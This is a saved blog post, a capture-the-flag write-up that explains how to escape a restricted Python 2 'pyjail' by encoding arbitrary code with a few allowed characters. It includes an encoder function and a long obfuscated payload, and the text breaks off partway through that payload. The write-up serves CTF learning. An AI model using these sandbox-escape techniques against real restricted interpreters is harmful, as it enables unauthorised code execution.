From: <Saved by Blink>
Snapshot-Content-Location: https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape.html
Subject: =?utf-8?Q?A=20python's=20escape=20from=20PlaidCTF=20jail=20=C2=B7=20wapif?=
 =?utf-8?Q?lapi?=
Date: Fri, 5 Feb 2021 12:56:56 -0000
MIME-Version: 1.0
Content-Type: multipart/related;
	type="text/html";
	boundary="----MultipartBoundary--HOuxZ2DQ0gQYS6F4mCJUmsOk3TTuYF8VKIn3YnDj2R----"


------MultipartBoundary--HOuxZ2DQ0gQYS6F4mCJUmsOk3TTuYF8VKIn3YnDj2R----
Content-Type: text/html
Content-ID: <frame-9A44161E8FDD9EB6F93C239277A1E76E@mhtml.blink>
Content-Transfer-Encoding: quoted-printable
Content-Location: https://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape.html

<!DOCTYPE html><html lang=3D"en-us"><head><meta http-equiv=3D"Content-Type"=
 content=3D"text/html; charset=3DUTF-8">
  <link href=3D"https://gmpg.org/xfn/11" rel=3D"profile">
  <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
 =20

  <!-- Enable responsiveness on mobile devices-->
  <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1.0, maximum-scale=3D1">

  <title>
   =20
      A python's escape from PlaidCTF jail =C2=B7 wapiflapi
   =20
  </title>

 =20


  <!-- CSS -->
  <link rel=3D"stylesheet" href=3D"https://wapiflapi.github.io/assets/css/m=
ain.css">
 =20

<link rel=3D"stylesheet" href=3D"https://fonts.googleapis.com/css?family=3D=
Abril+Fatface">

  <!-- Icons -->
  <link rel=3D"apple-touch-icon-precomposed" sizes=3D"144x144" href=3D"http=
s://wapiflapi.github.io/favicon.png">
<link rel=3D"shortcut icon" href=3D"https://wapiflapi.github.io/favicon.ico=
">

  <!-- RSS -->
  <link rel=3D"alternate" type=3D"application/rss+xml" title=3D"RSS" href=
=3D"https://wapiflapi.github.io/feed.xml">

  <!-- Additional head bits without overriding original head -->
</head>


  <body class=3D"post">

    <div id=3D"sidebar">
  <header>
    <div class=3D"site-title">
      <a href=3D"https://wapiflapi.github.io/">
       =20
          <span class=3D"back-arrow icon"><svg fill=3D"#000000" height=3D"2=
4" viewBox=3D"0 0 24 24" width=3D"24" xmlns=3D"http://www.w3.org/2000/svg">
  <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
  <path d=3D"M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z">=
</path>
</svg></span>
       =20
        wapiflapi
      </a>
    </div>
    <p class=3D"lead">Binary analysis, computer security, exploit writing, =
CTFs, hacking.</p>
  </header>
  <nav id=3D"sidebar-nav-links">
 =20
 =20

 =20

 =20


 =20

 =20
   =20
 =20

 =20

 =20


 =20


 =20

 =20
   =20
 =20

 =20

 =20


  <!-- Optional additional links to insert in sidebar nav -->
</nav>


 =20

  <nav id=3D"sidebar-icon-links">
 =20

  <a id=3D"subscribe-link" class=3D"icon" title=3D"Subscribe" aria-label=3D=
"Subscribe" href=3D"https://wapiflapi.github.io/feed.xml">
    <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"24" =
xmlns=3D"http://www.w3.org/2000/svg">
    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
    <circle cx=3D"6.18" cy=3D"17.82" r=3D"2.18"></circle>
    <path d=3D"M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-1=
5.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.=
9-9.9-9.9z"></path>
</svg>
  </a>

 =20
 =20
 =20
 =20

 =20

 =20

  <!-- Optional additional links to insert for icons links -->
</nav>

  <p>
  =C2=A9 2019.
  <a href=3D"https://wapiflapi.github.io/LICENSE.md">MIT License.</a>
</p>

</div>

    <main class=3D"container">
      <header>
  <h1 class=3D"post-title">A python's escape from PlaidCTF jail</h1>
</header>
<div class=3D"content">
  <div class=3D"post-meta">
  <span class=3D"post-date">22 Apr 2013</span>
  <span class=3D"post-categories">
   =20
  </span>
</div>


  <div class=3D"post-body">
    <p>Python jails are pretty common among CTF challenges. Often a good kn=
owledge of
the interpreter=E2=80=99s internals gets you a long way. For the non initia=
ted it might
sometimes seem like black magic. PlaidCTF offered a challenging task that
required the combination of some different techniques and logic.</p>

<p>This time there was a service listening on the remote server, with a pyt=
hon
script called for each new connection. We were told we had to get a shell
because we couldn=E2=80=99t guess where the flag was stored. Another import=
ant detail
is that the challenge was running on python2.6.6.</p>

<p>The script was given to us and you can find its code
<a href=3D"http://www.pnuts.tk/data/plaid2k13/pyjail/pyjail.py-ae426f39b325=
ed99123f590c8a8bbe224fefb406">here</a>.</p>

<h1 id=3D"overview">Overview</h1>

<p>Basically it sets up a jail, and then executes user input after some res=
tricting
checks. I shall present the different protections before explaining how we =
can
bypass most of them, and finally escape from this jail.</p>

<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
pre class=3D"highlight"><code><span class=3D"kn">from</span> <span class=3D=
"nn">sys</span> <span class=3D"kn">import</span> <span class=3D"n">modules<=
/span>
<span class=3D"n">modules</span><span class=3D"o">.</span><span class=3D"n"=
>clear</span><span class=3D"p">()</span>
<span class=3D"k">del</span> <span class=3D"n">modules</span>
</code></pre></div></div>

<p><code class=3D"highlighter-rouge">sys.modules</code> is a dictionary tha=
t contains all the modules which where imported
since the interpreter started. Clearing the modules breaks a lot of things.=
 It
breaks a lot of stuff because often a standard function will check if some
module is present. But deleting the modules altogether breaks even more cod=
e,
because now the check itself raises an exception!</p>

<p>The next step in setting up the jail=E2=80=99s environment is this:</p>

<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
pre class=3D"highlight"><code><span class=3D"n">__builtins__</span><span cl=
ass=3D"o">.</span><span class=3D"n">__dict__</span><span class=3D"o">.</spa=
n><span class=3D"n">clear</span><span class=3D"p">()</span>
<span class=3D"n">__builtins__</span> <span class=3D"o">=3D</span> <span cl=
ass=3D"bp">None</span>
</code></pre></div></div>

<p>This is pretty self explanatory. It clears the dictionary python uses to=
 find
its builtins and we can=E2=80=99t use them anymore except if we already hav=
e a reference
to the builtin we need somewhere else.</p>

<p>There is one protection left, but it doesn=E2=80=99t try to limit what w=
e can do, it
only tries to make it harder by filtering out certain characters and imposi=
ng a
length limit. Notice that the script calls <code class=3D"highlighter-rouge=
">_raw_input</code>, which is just backup it
made of <code class=3D"highlighter-rouge">raw_input</code> before clearing =
the builtins.</p>

<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
pre class=3D"highlight"><code><span class=3D"n">inp</span> <span class=3D"o=
">=3D</span> <span class=3D"n">_raw_input</span><span class=3D"p">()</span>
<span class=3D"n">inp</span> <span class=3D"o">=3D</span> <span class=3D"n"=
>inp</span><span class=3D"o">.</span><span class=3D"n">split</span><span cl=
ass=3D"p">()[</span><span class=3D"mi">0</span><span class=3D"p">][:</span>=
<span class=3D"mi">1900</span><span class=3D"p">]</span>
<span class=3D"c1">#Dick move: you also have to only use the characters tha=
t my solution did.
</span><span class=3D"n">inp</span> <span class=3D"o">=3D</span> <span clas=
s=3D"n">inp</span><span class=3D"o">.</span><span class=3D"n">translate</sp=
an><span class=3D"p">(</span><span class=3D"s">""</span><span class=3D"o">.=
</span><span class=3D"n">join</span><span class=3D"p">(</span><span class=
=3D"nb">map</span><span class=3D"p">(</span><span class=3D"nb">chr</span><s=
pan class=3D"p">,</span> <span class=3D"nb">xrange</span><span class=3D"p">=
(</span><span class=3D"mi">256</span><span class=3D"p">))),</span>
<span class=3D"s">'"!#$&amp;*+-/0123456789;=3D&gt;?ABCDEFGHIJKLMNOPQRSTUVWX=
YZ</span><span class=3D"se">\\</span><span class=3D"s">^ab</span><span clas=
s=3D"err">
</span><span class=3D"s">cdefghijklmnopqrstuvwxyz|'</span><span class=3D"p"=
>)</span>
</code></pre></div></div>

<p>Basically this means our input should be 1900 bytes or less, and should =
only
contain characters in the <code class=3D"highlighter-rouge">set([':', '%', =
"'", '</code>=E2=80=99, =E2=80=98(=E2=80=98, =E2=80=98,=E2=80=99, =E2=80=98=
)=E2=80=99, =E2=80=98}=E2=80=99, =E2=80=98{=E2=80=98,
=E2=80=98[=E2=80=99, =E2=80=98.=E2=80=99, =E2=80=98]=E2=80=99, =E2=80=98&lt=
;=E2=80=99, =E2=80=98_=E2=80=99, =E2=80=98~=E2=80=99])`, the split ensures =
there can=E2=80=99t be any white-
spaces. It=E2=80=99s important to note that we are also allowed to use most=
 of the non
printable characters if we want to.</p>

<p>After all this we finally get to the interesting part: code execution! W=
e are
lucky because it is in two stages, so we have twice the fun :-)</p>

<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
pre class=3D"highlight"><code><span class=3D"k">exec</span> <span class=3D"=
s">'a=3D'</span> <span class=3D"o">+</span> <span class=3D"n">_eval</span><=
span class=3D"p">(</span><span class=3D"n">inp</span><span class=3D"p">,</s=
pan> <span class=3D"p">{})</span> <span class=3D"ow">in</span> <span class=
=3D"p">{}</span>
</code></pre></div></div>

<p>Don=E2=80=99t be fooled. The eval is not in the exec. It could be writte=
n like this:</p>

<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
pre class=3D"highlight"><code><span class=3D"n">cmd</span> <span class=3D"o=
">=3D</span> <span class=3D"s">'a=3D'</span> <span class=3D"o">+</span> <sp=
an class=3D"n">_eval</span><span class=3D"p">(</span><span class=3D"n">inp<=
/span><span class=3D"p">,</span> <span class=3D"p">{})</span>
<span class=3D"k">exec</span> <span class=3D"n">cmd</span> <span class=3D"o=
w">in</span> <span class=3D"p">{}</span>
</code></pre></div></div>

<p>Quick reminder, in python <code class=3D"highlighter-rouge">eval</code> =
is used to evaluate an expression and returns
its value whereas <code class=3D"highlighter-rouge">exec</code> is a statem=
ent that compiles and executes a set of
statements. In short this means you can execute statements when you are usi=
ng
<code class=3D"highlighter-rouge">exec</code> but not when using <code clas=
s=3D"highlighter-rouge">eval</code>.</p>

<p>The empty dict given to <code class=3D"highlighter-rouge">eval</code> as=
 its second parameter and the <code class=3D"highlighter-rouge">in {}</code=
> after the
<code class=3D"highlighter-rouge">exec</code> both mean the same thing, tha=
t the code should be evaluated in a new
empty scope. So we can=E2=80=99t (in theory) pass stuff from the <code clas=
s=3D"highlighter-rouge">eval</code> to the <code class=3D"highlighter-rouge=
">exec</code>,
or interact with the outer-world in any way.</p>

<p>Most of python are just references, and this we can see here again. Thes=
e
protections only remove references. The original modules like <code class=
=3D"highlighter-rouge">os</code>, and the
builtins are not altered in any way. Our task is quiet clear, we need to fi=
nd a
reference to something useful and use it to find the flag on the file
system. But first we need to find a way of executing code with this little
characters allowed.</p>

<h1 id=3D"running-code">Running code</h1>

<p>How do we get code running with only characters from <code class=3D"high=
lighter-rouge">set([':', '%', "'", '</code>=E2=80=99,
=E2=80=98(=E2=80=98, =E2=80=98,=E2=80=99, =E2=80=98)=E2=80=99, =E2=80=98}=
=E2=80=99, =E2=80=98{=E2=80=98, =E2=80=98[=E2=80=99, =E2=80=98.=E2=80=99, =
=E2=80=98]=E2=80=99, =E2=80=98&lt;=E2=80=99, =E2=80=98_=E2=80=99, =E2=80=98=
~=E2=80=99])`? Answer: It=E2=80=99s python,
python is fun, let=E2=80=99s have some fun.</p>

<p>We have everything we need to build tuples <code class=3D"highlighter-ro=
uge">()</code>, lists <code class=3D"highlighter-rouge">[]</code> and dicti=
onaries
<code class=3D"highlighter-rouge">{:}</code>.  If it was python 2.7 we coul=
d also make sets using <code class=3D"highlighter-rouge">{}</code> but sadl=
y that
isn=E2=80=99t the case. We can also build strings using <code class=3D"high=
lighter-rouge">' '</code> and we could use <code class=3D"highlighter-rouge=
">%</code> to do
some formatting. The comma will obviously help when building tuples or list=
s,
and the dot might be useful to access attributes.</p>

<p>We haven=E2=80=99t talked about <code class=3D"highlighter-rouge">&lt;</=
code>, <code class=3D"highlighter-rouge">~</code>, <code class=3D"highlight=
er-rouge">_</code> and <code class=3D"highlighter-rouge">`</code>, yet. <co=
de class=3D"highlighter-rouge">&lt;</code> and <code class=3D"highlighter-r=
ouge">~</code> are simple
operators, we can do less-than comparison and binary-negation. <code class=
=3D"highlighter-rouge">_</code> would be a
way to have something valid for a variable identifier, but we do not have <=
code class=3D"highlighter-rouge">=3D</code> so
that might not be of much use.</p>

<p>Now, if you are like me and didn=E2=80=99t know <code class=3D"highlight=
er-rouge">`</code> actually did something in
python2 you might be surprised! As it turns out <code class=3D"highlighter-=
rouge">`x`</code> is equivalent to
<code class=3D"highlighter-rouge">repr(x)</code>!  This means we can produc=
e strings out of objects.</p>

<p>Some of these symbols can be used for multiple purposes, <code class=3D"=
highlighter-rouge">%</code> can be used for
string formatting but also for integer modulo and <code class=3D"highlighte=
r-rouge">&lt;</code> can be used both for
comparing to integers and in the form of <code class=3D"highlighter-rouge">=
&lt;&lt;</code> binary-shifting them to the left</p>

<p>We can see that most of the characters we are allowed to use are pretty =
useful
and I dare say it is easier doing python with only those than it would be
without them!</p>

<p>Remember we have two execution stages, first the <code class=3D"highligh=
ter-rouge">eval</code>, then the <code class=3D"highlighter-rouge">exec</co=
de>. The
<code class=3D"highlighter-rouge">exec</code> executes what the <code class=
=3D"highlighter-rouge">eval</code> returns. So we should consider the <code=
 class=3D"highlighter-rouge">eval</code> as a
decoder. The 1900 character limit is supposed to force you to think a lot a=
bout
this, but we bypassed it (as I will explain later), that is why we didn=E2=
=80=99t put to
much thought into the encoding scheme.</p>

<p>The first thing to notice is that <code class=3D"highlighter-rouge">[]&l=
t;[]</code> is <code class=3D"highlighter-rouge">False</code>, which is pre=
tty
logical. What is less explainable but serves us well is the fact that <code=
 class=3D"highlighter-rouge">{}&lt;[]</code>
evaluates to <code class=3D"highlighter-rouge">True</code>.</p>

<p><code class=3D"highlighter-rouge">True</code> and <code class=3D"highlig=
hter-rouge">False</code>, when used in arithmetic operations, behave like <=
code class=3D"highlighter-rouge">1</code> and
<code class=3D"highlighter-rouge">0</code>. This will be the building block=
 of our decoder but we still need to find a
way to actually produce arbitrary strings.</p>

<h2 id=3D"getting-characters">Getting characters</h2>

<p>Let=E2=80=99s start with a generic solution, we will improve on it later=
. Getting the
numeric ASCII values of our characters seems doable with <code class=3D"hig=
hlighter-rouge">True</code>, <code class=3D"highlighter-rouge">False</code>=
, <code class=3D"highlighter-rouge">~</code>
and <code class=3D"highlighter-rouge">&lt;&lt;</code>. But we need somethin=
g like <code class=3D"highlighter-rouge">str()</code> or <code class=3D"hig=
hlighter-rouge">"%c"</code>. This is where the
invisible characters come in handy! <code class=3D"highlighter-rouge">"\xcb=
"</code> for example, it=E2=80=99s not even ascii as
it is larger than 127, but it is valid in a python string, and we can send =
it to
the server.</p>

<p>If we take its representation using <code class=3D"highlighter-rouge">`'=
_\xcb_'`</code> (In practice we will send a
byte with the value <code class=3D"highlighter-rouge">0xcb</code> <em>not</=
em> <code class=3D"highlighter-rouge">'\xcb'</code>), we have a string cont=
aining a c. We
also need a <code class=3D"highlighter-rouge">'%'</code>, and we need those=
 two, and those two only.</p>

<p>We want this: <code class=3D"highlighter-rouge">`'%\xcb'`[1::3]</code> ,=
 using True and False to build the numbers we
get:</p>

<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
pre class=3D"highlight"><code><span class=3D"sb">`'%\xcb'`</span><span clas=
s=3D"p">[{}</span><span class=3D"o">&lt;</span><span class=3D"p">[]::</span=
><span class=3D"o">~</span><span class=3D"p">(</span><span class=3D"o">~</s=
pan><span class=3D"p">({}</span><span class=3D"o">&lt;</span><span class=3D=
"p">[])</span><span class=3D"o">&lt;&lt;</span><span class=3D"p">({}</span>=
<span class=3D"o">&lt;</span><span class=3D"p">[]))]</span>
</code></pre></div></div>

<p>There you go! Now provided we can have any number build using the same t=
rick as
for the indexes we just have to use the above and <code class=3D"highlighte=
r-rouge">%(number)</code> to get any
character we want.</p>

<p>Some optimization is possible for specific characters by finding them in=
 the
representations of True, False and the invisible characters. As I am about =
to
bypass the length limit I didn=E2=80=99t bother doing this to much.</p>

<h2 id=3D"numbers">Numbers</h2>

<p>This is where I failed during the CTF and what cost me the shame of gett=
ing
the flag five minutes after the end. Had I coded something to automate the
process of getting arbitrary numbers I wouldn=E2=80=99t have missed spaces =
when I
finally got a shell. But more on that later. The point is I shall do it rig=
ht
now.</p>

<p>If you have ever studied any logic you might have encountered the claim =
that
everything could be done with NAND gates. NOT-AND. This is remarkably close=
 to
how we shall proceed, except for the fact we shall use multiply-by-two inst=
ead
of AND. We won=E2=80=99t use True.</p>

<p>Everything can be done using only <code class=3D"highlighter-rouge">Fals=
e</code> (0), <code class=3D"highlighter-rouge">~</code> (not), <code class=
=3D"highlighter-rouge">&lt;&lt;</code> (x2), let me show
you with an example. We shall go from 42 to 0 using <code class=3D"highligh=
ter-rouge">~</code> and <code class=3D"highlighter-rouge">/2</code>, then w=
e can
revert that process using <code class=3D"highlighter-rouge">~</code> and <c=
ode class=3D"highlighter-rouge">*2</code>.</p>

<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
pre class=3D"highlight"><code> <span class=3D"mi">42</span> <span class=3D"=
c1"># /2
</span> <span class=3D"mi">21</span> <span class=3D"c1"># ~
</span><span class=3D"o">-</span><span class=3D"mi">22</span> <span class=
=3D"c1"># /2
</span><span class=3D"o">-</span><span class=3D"mi">11</span> <span class=
=3D"c1"># ~
</span> <span class=3D"mi">10</span> <span class=3D"c1"># /2
</span>  <span class=3D"mi">5</span> <span class=3D"c1"># ~
</span> <span class=3D"o">-</span><span class=3D"mi">6</span> <span class=
=3D"c1"># /2
</span> <span class=3D"o">-</span><span class=3D"mi">3</span> <span class=
=3D"c1"># ~
</span>  <span class=3D"mi">2</span> <span class=3D"c1"># /2
</span>  <span class=3D"mi">1</span>

<span class=3D"bp">True</span> <span class=3D"o">=3D</span> <span class=3D"=
o">~</span><span class=3D"p">(</span><span class=3D"o">~</span><span class=
=3D"p">(</span><span class=3D"o">~</span><span class=3D"p">(</span><span cl=
ass=3D"o">~</span><span class=3D"p">(</span><span class=3D"mi">42</span><sp=
an class=3D"o">/</span><span class=3D"mi">2</span><span class=3D"p">)</span=
><span class=3D"o">/</span><span class=3D"mi">2</span><span class=3D"p">)</=
span><span class=3D"o">/</span><span class=3D"mi">2</span><span class=3D"p"=
>)</span><span class=3D"o">/</span><span class=3D"mi">2</span><span class=
=3D"p">)</span><span class=3D"o">/</span><span class=3D"mi">2</span><span c=
lass=3D"o">/</span><span class=3D"mi">2</span>
</code></pre></div></div>

<p>Basically we divided by two when we could, else we inverted all the bits=
. The
nice property of this is that when inverting we are guaranteed to be able t=
o
divide by two afterward. So that finally we shall hit 1, 0 or -1.</p>

<p>But wait. Didn=E2=80=99t I say we would not use True, 1? Yes I did, but =
I lied. We will
use it because True is obviously shorter than <code class=3D"highlighter-ro=
uge">~(~False*2)</code>, especially
considering the fact we will use True anyway to do x2, which in our case is=
 of
course <code class=3D"highlighter-rouge">&lt;&lt;({}&lt;[])</code>.</p>

<p>Anyway, the moment we hit 1, 0 or -1 we can just use <code class=3D"high=
lighter-rouge">True</code>, <code class=3D"highlighter-rouge">False</code> =
or
<code class=3D"highlighter-rouge">~False</code>.</p>

<p>So now we can reverse this and we have:</p>

<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
pre class=3D"highlight"><code><span class=3D"mi">42</span> <span class=3D"o=
">=3D</span> <span class=3D"o">~</span><span class=3D"p">(</span><span clas=
s=3D"o">~</span><span class=3D"p">(</span><span class=3D"o">~</span><span c=
lass=3D"p">(</span><span class=3D"o">~</span><span class=3D"p">(</span><spa=
n class=3D"mi">1</span><span class=3D"o">*</span><span class=3D"mi">2</span=
><span class=3D"p">)</span><span class=3D"o">*</span><span class=3D"mi">2</=
span><span class=3D"p">)</span><span class=3D"o">*</span><span class=3D"mi"=
>2</span><span class=3D"p">)</span><span class=3D"o">*</span><span class=3D=
"mi">2</span><span class=3D"p">)</span><span class=3D"o">*</span><span clas=
s=3D"mi">2</span>
</code></pre></div></div>

<p>Using what we are allowed to:</p>

<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
pre class=3D"highlight"><code><span class=3D"mi">42</span> <span class=3D"o=
">=3D</span> <span class=3D"o">~</span><span class=3D"p">(</span><span clas=
s=3D"o">~</span><span class=3D"p">(</span><span class=3D"o">~</span><span c=
lass=3D"p">(</span><span class=3D"o">~</span><span class=3D"p">(({}</span><=
span class=3D"o">&lt;</span><span class=3D"p">[])</span><span class=3D"o">&=
lt;&lt;</span><span class=3D"p">({}</span><span class=3D"o">&lt;</span><spa=
n class=3D"p">[]))</span><span class=3D"o">&lt;&lt;</span><span class=3D"p"=
>({}</span><span class=3D"o">&lt;</span><span class=3D"p">[]))</span><span =
class=3D"o">&lt;&lt;</span><span class=3D"p">({}</span><span class=3D"o">&l=
t;</span><span class=3D"p">[]))</span><span class=3D"o">&lt;&lt;</span><spa=
n class=3D"p">({}</span><span class=3D"o">&lt;</span><span class=3D"p">[]))=
</span><span class=3D"o">&lt;&lt;</span><span class=3D"p">({}</span><span c=
lass=3D"o">&lt;</span><span class=3D"p">[])</span>
</code></pre></div></div>

<p>How to not loose a CTF:</p>

<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
pre class=3D"highlight"><code><span class=3D"k">def</span> <span class=3D"n=
f">brainfuckize</span><span class=3D"p">(</span><span class=3D"n">nb</span>=
<span class=3D"p">):</span>
    <span class=3D"k">if</span> <span class=3D"n">nb</span> <span class=3D"=
ow">in</span> <span class=3D"p">[</span><span class=3D"o">-</span><span cla=
ss=3D"mi">2</span><span class=3D"p">,</span> <span class=3D"o">-</span><spa=
n class=3D"mi">1</span><span class=3D"p">,</span> <span class=3D"mi">0</spa=
n><span class=3D"p">,</span> <span class=3D"mi">1</span><span class=3D"p">]=
:</span>
        <span class=3D"k">return</span> <span class=3D"p">[</span><span cla=
ss=3D"s">"~({}&lt;[])"</span><span class=3D"p">,</span> <span class=3D"s">"=
~([]&lt;[])"</span><span class=3D"p">,</span>
		         <span class=3D"s">"([]&lt;[])"</span><span class=3D"p">,</span> =
 <span class=3D"s">"({}&lt;[])"</span><span class=3D"p">][</span><span clas=
s=3D"n">nb</span><span class=3D"o">+</span><span class=3D"mi">2</span><span=
 class=3D"p">]</span>

    <span class=3D"k">if</span> <span class=3D"n">nb</span> <span class=3D"=
o">%</span> <span class=3D"mi">2</span><span class=3D"p">:</span>
        <span class=3D"k">return</span> <span class=3D"s">"~</span><span cl=
ass=3D"si">%</span><span class=3D"s">s"</span> <span class=3D"o">%</span> <=
span class=3D"n">brainfuckize</span><span class=3D"p">(</span><span class=
=3D"o">~</span><span class=3D"n">nb</span><span class=3D"p">)</span>
    <span class=3D"k">else</span><span class=3D"p">:</span>
        <span class=3D"k">return</span> <span class=3D"s">"(</span><span cl=
ass=3D"si">%</span><span class=3D"s">s&lt;&lt;({}&lt;[]))"</span> <span cla=
ss=3D"o">%</span> <span class=3D"n">brainfuckize</span><span class=3D"p">(<=
/span><span class=3D"n">nb</span><span class=3D"o">/</span><span class=3D"m=
i">2</span><span class=3D"p">)</span>
</code></pre></div></div>

<p>I wonder if using % as a modulo might optimize the length of some of the=
se
expressions. If you have any thoughts about this feel free to talk to me ab=
out
it!</p>

<h2 id=3D"and-in-the-darkness-bind-them"><em>And in the darkness bind them!=
</em></h2>

<p>Joining is not trivial, but there is a little trick that makes it quite =
easy.
If we were building a list of characters the representation of that list wo=
uld
contain all those characters (obviously), and the best part is they should =
be
equally spaced. A simple slice should be enough to give us the complete str=
ing.</p>

<pre><code class=3D"language-pycon">&gt;&gt;&gt; `['a', 'b', 'c', 'd']`[2::=
5]
'abcd'

&gt;&gt;&gt; `['a', 'b', 'c', 'd']`[(({}&lt;[])&lt;&lt;({}&lt;[]))::~(~(({}=
&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))]
'abcd'
</code></pre>

<p>Since we have the ability to generate arbitrary numbers and single chara=
cters
this works well.</p>

<p>However <em>care must be taken</em> because this does not always work. I=
n particular
when the representation of a character is composed of more than one charact=
er,
such cases include but are not limited to <code class=3D"highlighter-rouge"=
>\n</code>, <code class=3D"highlighter-rouge">\t</code>, <code class=3D"hig=
hlighter-rouge">\\</code>, etc=E2=80=A6 Luckily those
characters are seldom needed, and we won=E2=80=99t use them.</p>

<p>We can now generate almost all the code we want from the <code class=3D"=
highlighter-rouge">eval()</code> and it will be
passed to the exec statement!</p>

<p>Before moving on to the next step, let=E2=80=99s enjoy some valid python=
 code!</p>

<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
pre class=3D"highlight"><code>    <span class=3D"sb">`[`</span><span class=
=3D"s">'</span><span class=3D"si">%</span><span class=3D"se">\xcb</span><sp=
an class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;=
({}&lt;[]))]%(((~(~(~(~(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt=
;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),=
`</span><span class=3D"s">'</span><span class=3D"si">%</span><span class=3D=
"se">\xcb</span><span class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]::~(=
~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt=
;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&l=
t;&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><span class=3D"si">%</=
span><span class=3D"se">\xcb</span><span class=3D"s">'</span><span class=3D=
"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(~(~((~(~({}&lt;[])&=
lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))=
&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><=
span class=3D"si">%</span><span class=3D"se">\xcb</span><span class=3D"s">'=
</span><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(((=
(((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&=
lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><span =
class=3D"si">%</span><span class=3D"se">\xcb</span><span class=3D"s">'</spa=
n><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(((~((=
~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&=
lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span class=
=3D"s">'</span><span class=3D"si">%</span><span class=3D"se">\xcb</span><sp=
an class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;=
({}&lt;[]))]%(~(~((((~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt=
;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),=
`</span><span class=3D"s">'</span><span class=3D"si">%</span><span class=3D=
"se">\xcb</span><span class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]::~(=
~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(~((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&=
lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))=
&lt;&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><span class=3D"si">%=
</span><span class=3D"se">\xcb</span><span class=3D"s">'</span><span class=
=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(~(~((~(~({}&lt;[=
])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[=
]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span class=3D"s">'</spa=
n><span class=3D"si">%</span><span class=3D"se">\xcb</span><span class=3D"s=
">'</span><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%=
((((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&l=
t;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><sp=
an class=3D"si">%</span><span class=3D"se">\xcb</span><span class=3D"s">'</=
span><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(=
(~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))=
&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span cl=
ass=3D"s">'</span><span class=3D"si">%</span><span class=3D"se">\xcb</span>=
<span class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&=
lt;({}&lt;[]))]%(~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))=
